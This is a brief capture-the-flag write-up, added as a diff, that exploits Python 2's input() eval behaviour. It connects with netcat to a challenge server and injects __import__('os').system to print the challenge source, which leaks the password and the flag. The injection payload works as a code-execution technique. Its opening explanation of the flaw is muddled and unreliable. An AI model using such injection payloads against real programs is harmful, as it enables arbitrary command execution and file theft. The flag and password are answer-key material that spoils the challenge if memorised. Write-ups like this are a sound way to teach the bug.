@@ -1,0 +1,17 @@
+
+The vulnerability in input() method lies in the fact that the variable accessing
+the value of input can be accessed by anyone just by using the name of variable or method.
+
+In other words, our input will be treated as python code and will be executed.
+
+__import__('os').system('cat /srv/pwn05/programa.py')
+
+nc 45.63.104.42 4553
+__import__('os').system('cat /srv/pwn05/programa.py')
+senha = input("")
+
+if senha == 1337133731415:
+        print "Pegue sua flag: ALQ{3val_c0m_python_2}"
+else:
+        print "Errouuuu!!!!"
+Errouuuu!!!!
